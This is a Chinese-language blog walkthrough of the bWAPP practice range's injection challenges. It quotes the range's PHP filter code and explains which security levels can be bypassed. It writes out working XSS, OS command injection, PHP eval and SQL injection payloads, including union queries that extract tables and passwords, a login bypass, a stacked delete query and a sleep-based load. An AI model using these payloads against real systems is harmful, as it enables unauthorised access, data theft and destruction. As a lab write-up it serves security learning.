---
title: bwapp通关之A1-Injection
date: 2022-08-01 11:05:32
tags: 
- bwapp
- 靶场
---
# HTML Injection - Reflected(GET) 
## low 级别
low级别意味着没有任何检查
输入`<h1>This is a test</h1>`，可以看到可以被完整解析到页面上
![](https://i.imgur.com/A9iGfgJ.png)

输入`<meta http-equiv="refresh" content='0; url=https://xxx:xxx/portal.php`
![](https://i.imgur.com/Ao8E5ic.png )

## medium 级别
进行和low级别相同操作
![](https://i.imgur.com/VbjtMEA.png)

发现无法注入成功
抓包可见cookie值有变化

![](https://i.imgur.com/quGGiYz.png)

![](https://i.imgur.com/FRKq9XX.png)

查看源码app/htmli_get.php

![](https://i.imgur.com/E4MkkpO.png)

进一步找到xss_check_1,在app/functions_external.php中
![](https://i.imgur.com/vtSeVJo.png)

可以看出medium级别的检查是先将输入的<>转为html字符实体&lt和&gt
然后对输入解码
这里可以看到bwapp提供了三个例子

`<script>alert(0)</script>`
`%3Cscript%3Ealert%280%29%3C%2Fscript%3E` //这是对`<script>alert(0)</script>`的一次编码
`%253Cscript%253Ealert%25280%2529%253C%252Fscript%253E` //这是对`<script>alert(0)</script>`的二次编码

不难得出解决办法是输入编码后的代码
这里就不放图了

## high 级别
运行和medium相同操作,也是无法注入成功,查看代码
发现是带有ENT_QUOTES参数的htmlspecialchars()函数,
暂时没想到办法
![](https://i.imgur.com/9QZnrY9.png)

# HTML Injection - Reflected(POST)
同GET方式

# HTML Injection - Reflected (URL)
## low 级别
抓包如图示,将编码部分更改即可
![](https://i.imgur.com/cxNSH0x.png)
![](https://i.imgur.com/v8SJIPz.png)

根据源码
![](https://i.imgur.com/fPFU8hI.png)

也可以更改host
![](https://i.imgur.com/QysdV76.png)

## medium 级别
该问题似乎是在 Javascript 中运行的 DOM XSS 中的一个漏洞.
它已在最近的浏览器中得到处理。现在的浏览器可以对URL中的<>字符进行编码,从而导致攻击失败.
可以在老版本的IE中实现进攻.

## high 级别
可以从源码看到再次使用了带有ENT_QUOTES参数的htmlspecialchars()函数,不可绕过.

# HTML Injection - Stored (Blog)
## low 级别
直接尝试注入，可行
![](https://i.imgur.com/RBcI4bt.png)

## medium&high 级别
尝试注入,发现没有被解析
![](https://i.imgur.com/n1WdAd6.png)
    
查看源码 app/htmli_stored.php
```php
function htmli($data)
{

    include("connect_i.php");

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $data = sqli_check_3($link, $data);
            break;

        case "1" :

            $data = sqli_check_3($link, $data);
            // $data = xss_check_4($data);
            break;

        case "2" :

            $data = sqli_check_3($link, $data);
            // $data = xss_check_3($data);
            break;

        default :

            $data = sqli_check_3($link, $data);
            break;

    }

    return $data;
}
```

![](https://i.imgur.com/65DZ2S5.png)
```php
// app/functions_external.php
function xss_check_3($data, $encoding = "UTF-8")
{

    // htmlspecialchars - converts special characters to HTML entities    
    // '&' (ampersand) becomes '&amp;' 
    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
    // '<' (less than) becomes '&lt;'
    // '>' (greater than) becomes '&gt;'  
    
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
    
}
```
发现最终拦路关卡是 htmlspecialchars(),认输.

# iFrame Injection
> iframe是可用于在HTML页面中嵌入一些文件(如文档，视频等)的一项技术。对iframe最简单的解释就是“iframe是一个可以在当前页面中显示其它页面内容的技术”  
> 通过利用iframe标签对网站页面进行注入，是利用了HTML标签，实际上就是一个阅读器，可以阅读通过协议加载的活服务器本地的文件、视频等

## low 级别
![](https://i.imgur.com/o4Ucg47.png)

尝试修改参数,成功
![](https://i.imgur.com/1oR7NZB.png)

## medium 级别
尝试low级别相同操作,果然不行  
查看代码
```php
function xss($data)
{

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $data = no_check($data);
            break;

        case "1" :

            $data = xss_check_4($data);
            break;

        case "2" :

            $data = xss_check_3($data);
            break;

        default :

            $data = no_check($data);
            break;

    }

    return $data;

}

if($_COOKIE["security_level"] == "1" || $_COOKIE["security_level"] == "2")
{

?>
    <iframe frameborder="0" src="robots.txt" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
<?php

}

else
{

?>
    <iframe frameborder="0" src="<?php echo xss($_GET["ParamUrl"])?>" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
<?php

}


function xss_check_4($data)
{

    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
    // Do NOT use this for XSS or HTML validations!!!
    
    return addslashes($data);
    
}
```

可以看到检测手法是addslashes()函数,而在iframe标签里,最后面的元素是ParamWidth,所以可以在宽度后附上payload,如图:
![](https://i.imgur.com/IVX5T18.png)

## high 级别
老样子, htmlspecialchars()函数

# LDAP Connection Settings

> LDAP Lightweight Directory Access Protocol 轻量级目录访问协议

因为要安装环境，暂时略过

# Mail Header Injection (SMTP)
> 注入原理:  
> 邮件的结构,分为信封(MAIL FROM,RCPT TO),头部(From,To,Subject,CC,BCC等),主体(message),mail header injection,即针对头部的注入.使用telnet对25端口进行手工发邮件的过程的事后会发现，对于邮件头部的字段其实就是换行符0x0A或者0x0D0x0A分割,即\n或\r\n,所以就可以注入了.

由于bwapp邮件服务没设置好,这里也不演示了

# OS Command Injection
## low 级别
思路就是输入不止一条命令  
可以用 **;**,可以用  **&**,也可以用 **|**
![](https://i.imgur.com/0vmDfGf.png)  

另外,如果没有回显,可能是你的环境不支持nslookup命令

## medium 级别
同 low 级别思路,发现只有 **|** 可以用.  
查看代码  
![](https://i.imgur.com/IbGQsMs.png)
![](https://i.imgur.com/NuAvnhU.png)

可以看到 `commandi_check_1()` 把 `&` 和 `;`替换了.

## high 级别
`escapeshellcmd()`确保用户只执行一个命令  
暂时无法注入

# OS Command lnjection - Blind
## low 级别
没有回显,通过时间盲注  
![](https://i.imgur.com/TSZ4FI2.png)

## medium 级别
同理，使用管道符即可

# PHP Code Injection
## low 级别
观察发现请求页面的message参数，尝试使用php函数作为参数
![](https://i.imgur.com/rHfwhav.png)
![](https://i.imgur.com/K6pvwzh.png)
可以获取/etc/passwd文件的信息
猜测是使用了`eval`函数且未检查参数
## medium&high 级别
![](https://i.imgur.com/3UDDnN3.png)
上图可见移除了`eval`函数,且使用`htmlspecialchars `来处理参数

# Server-Side Includes (SSI) Injection
> SSI是用于向HTML页面提供动态内容的Web应用程序上的指令。 它们与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI。

SSI基本格式`<!-– 指令名称="指令参数">`
由于环境不支持,就不演示了

# SQL Injection 
## sql 注入分类
**按照注入点类型分类**
- 数字型注入点
- 字符型注入点
- 搜索型注入点

**按照http传递数据的方式分类**
- get 注入
- post 注入
- cookie 注入
- http请求头注入
  
**按照执行效果分类**
- 基于报错的注入
- 布尔类型注入
- 时间盲注

## sql 注入的常见方法
- 特殊字符
  - 比如分号(堆叠注入):
  ```sql
  select * from user where id = 1;delete from user
  ```
  - 比如注释符:
  ```sql
  # sleep(500)可对系统资源造成极大耗损
  select count(*) as num from game_score where game_id = 244 and version = '-1' or 3 and sleep(500)-- 注释掉可能对注入造成干扰的语句
  /*
  还有这种注释
  */
  ```
  - 比如单引号: `1' or '1'='1`
- 针对黑名单过滤
  - sql 语句同义变形体
  - 双写绕过
- 针对中间链环节如编码
  - 宽字节注入(去掉转义符)
- 存储型注入,针对后端/数据库输入
  比如:用户名输入`admin'#`
## 一般步骤(非盲)
1. 判断是否存在注入，注入是字符型还是整数型

2. 猜解SQL查询语句中的字段数 (order by )

3. 确定显示的字段顺序 

4. 获取当前数据库 (爆库)

5. 获取数据库中的表 (爆表)

6. 获取表中的字段名 (爆字段)

7. 下载数据 (爆数据)
## bwapp 中的 sql 注入
## (GET/Search && GET/Select)
- **low**
  payload: `g%' union select 1,database(),3,5,4,6,7 -- `  注意有个空格
  ![](https://i.imgur.com/JBZG0YG.png)
  或者`' and 1=0 union all select 1,table_name, column_name,4,5,6,7 from information_schema.columns where table_schema='bWAPP'#`
  ![](https://i.imgur.com/pdmn4xb.png)
- **medium**
    ![](https://i.imgur.com/snYzxQx.png)
    ![](https://i.imgur.com/WA2da3P.png)
    又是`addslashes()`函数,此函数的作用是在预定义的字符前加上`\`进行转义,  
    预定义字符有`'`,`"`,`\`,NULL  
    数据库如果是GBK编码可以考虑宽字节注入
- **high**
  采用`mysql_real_escape_string()`函数防御,此函数转义sql语句中的特殊字符,没有想到注入方法

## (POST/Search & POST/Select)
基本和 GET 方式一样,多了一步抓包
![](https://i.imgur.com/LUQGlur.png)

## (AJAX/JSON/jQuery)
- **low**
    使用 GET 请求方式输入 url 并不能查询到数据,原因是没有经过页面 JS 的交互,
    可以看到禁用了 js 后无论输入什么内容都没有回显
    ![](https://i.imgur.com/k0qFD6V.png)
    ![](https://i.imgur.com/8aF7AQA.png)
    ![](https://i.imgur.com/IJiawfJ.png)
    于是查看网页源代码
    ![](https://i.imgur.com/MgUiz8O.png)
    可以看到是从`sqli_10-2.php`获取的 json 数据
    同样的,抓包也可以抓到:
    ![](https://i.imgur.com/duTwNvS.png)
    于是从`sqli_10-2.php`注入
    ![](https://i.imgur.com/ShgT94S.png)
    接下来和上面一样了
- **medium&high**
  同上也是`addslashes()`与`mysql_real_escape_string()`防御

## (CAPTCHA)
在注入前需要输入验证码,除此之外和上面没有别的区别
## (Login Form/Hero)
- **low**
  先找注入点
  ![](https://i.imgur.com/SXxK9mR.png)
  可以 SQL 注入
  猜测sql语句为
  ```php
  select * from user where username=' $username 'and password=' $password ';
  ```
  于是构造payload为:
  > 用户名: ' or 1=1#
  > 密码: 随义

  ![](https://i.imgur.com/xGCy9U8.png)

- **medium&high**
  同上也是`addslashes()`与`mysql_real_escape_string()`防御

## (Login Form/User)
- **low**
  和上面一样的方法,发现并不能注入
  ![](https://i.imgur.com/BYvzBs8.png)
  于是从头再来,先试试`bee'`:
  ![](https://i.imgur.com/urcjubJ.png)
  看不到 password 的回显
  于是多测几次,发现密码无论输入什么,不会对显示有任何影响
  后续也尝试了一些方法,也不起作用,只能判断出字段数为9
  于是使用sqlmap
  ![](https://i.imgur.com/CXelA70.png)
  成功获得数据库及表名
  ![](https://i.imgur.com/UB10Ubj.png)
  接下来查看users表的内容
  ![](https://i.imgur.com/w7zhDJo.png)
  ![](https://i.imgur.com/C8Yyej2.png)
  查看用户名密码
  ![](https://i.imgur.com/wr9jpJU.png)
  ![](https://i.imgur.com/Bsk2jtA.png)
  ![](https://i.imgur.com/ed8N25A.png)
  
- **medium&high**
  无法注入

## (SQLite)
- SQLite介绍
  > SQLite含有一张内置表“sqlite_master”,表里存储着type、name、tbl_name、rootpage、sql五个字段。
  
    |字段| 记录信息|
    |- |-|
    |type列   |  项目的类型，如table、index、view、trigger|
    |tbl_name|  所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身；|
    |name    |  项目的名称，如表名、索引名等；|
    |rootpage|  项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL|
    |sql     |  存放着所有表的创建语句，即表的结构。|


- **low**
  首先安装php sqlite模块:
  ```shell
  apt-get install sqlite3
  apt-get install php5-sqlite
  service apache2 restart
  ```
  搜索 man,有三个结果,可见为模糊查询
  ![](https://i.imgur.com/FbhHIsf.png)

  于是尝试注入: 
  ![](https://i.imgur.com/6QKXtqH.png)
  接下来常规操作:
  - 判断字段数: `%' order by 6 --`
  - 判断字段顺序: `%' union select 1,2,3,4,5,6 --`
  ![](https://i.imgur.com/NE8EKjS.png)
  - 查表: `%' union select 1,sqlite_version(),name,5,4,6 from sqlite_master --`
  ![](https://i.imgur.com/OjJjgnm.png)
  - 查字段: `%' union select 1,sqlite_version(),sql,5,4,6 from sqlite_master --`
  ![](https://i.imgur.com/hLGOhoT.png)
  - 取值: `%' union select 1,2,login,password,4,6 from users --`
  ![](https://i.imgur.com/PHdKKdB.png)
  - 解密
  ![](https://i.imgur.com/XS7Vji4.png)

- **medium&high**
  无法注入

## Drupal SQL Injection (Drupageddon)
> CVE-2014-3704  
> Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。
## Stored (Blog)
此类 sql 注入语句一般为 insert 或 update 语句 
- **low**
  首先判断注入点常规使用 `xxx'`的方式 输入 `hack'`提交
  ![](https://i.imgur.com/Ta8rLGE.png)
  存在注入点,查表: `hack',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#`
  ![](https://i.imgur.com/B2UhxdG.png)
  后面也是常规操作

- **medium**
  尝试xss注入
  ![](https://i.imgur.com/5kTOiW6.png)
  查看代码发现是`addslashes()`,没有对xss进行防御

- **high**
  `htmlspecialchars()`防御,无法注入
  ![](https://i.imgur.com/cZRRzjU.png)


## Stored (SQLite)
常规思路

## Stored(User-Agent)
- **low**
- 利用User-Agent注入
  ![](https://i.imgur.com/6WMF4rY.png)
  ![](https://i.imgur.com/rpOw3MW.png)
  然后思路也是一样

- **medium&high**
  `addslashes()`与`mysql_real_escape_string()`防御,未发现注入方法

## Stored (XML)
- **low**
  抓包可见请求发送给sqli_8-2.php
  ![](https://i.imgur.com/pAmBe7B.png)
  ![](https://i.imgur.com/dfKkb1Z.png)
  尝试对POST体做注入点判断
  ![](https://i.imgur.com/yK85br3.png)
  存在注入点,然后尝试常规方法判断字段数,发现无法判断,考虑非`select`语句,结合reset这个单词,猜测为`update`语句,尝试报错注入
  这里我们尝试用`updatexml()` 方法来注入,依旧是常规思路:库-表-字段-数据
  ![](https://i.imgur.com/2hf2pK9.png)
  ![](https://i.imgur.com/SO4qGJ2.png)
  ![](https://i.imgur.com/UmkInfE.png)
  ![](https://i.imgur.com/vLtSpgv.png)
  ![](https://i.imgur.com/SLquFVD.png)
  大体思路如上

- **medium&high**
  这里的 login 直接取了session的登录名,无法注入
  ![](https://i.imgur.com/lKAODF9.png)


## Boolean-Based
- **low**
  判断是否是模糊查询,结果是字符串精准匹配
  ![](https://i.imgur.com/Z486jjN.png)
  ![](https://i.imgur.com/N6mh2Bv.png)
  然后就是手工盲注
  ![](https://i.imgur.com/dlOpvRa.png)
  不详细展开

- **medium&high**
  无法注入,原因和之前一样
  ![](https://i.imgur.com/5hzFkpM.png)

## Blind - Time-Based
- **low**
  ![](https://i.imgur.com/6JsEbpj.png)
  时间盲注,建议sqlmap或者自行编写脚本跑
- **medium&high**
- 无法注入
  同上也是`addslashes()`与`mysql_real_escape_string()`防御
## Blind (SQLite)
思路一样,没什么特别的地方
## Blind (WS/SOAP)
思路一样,没什么特别的地方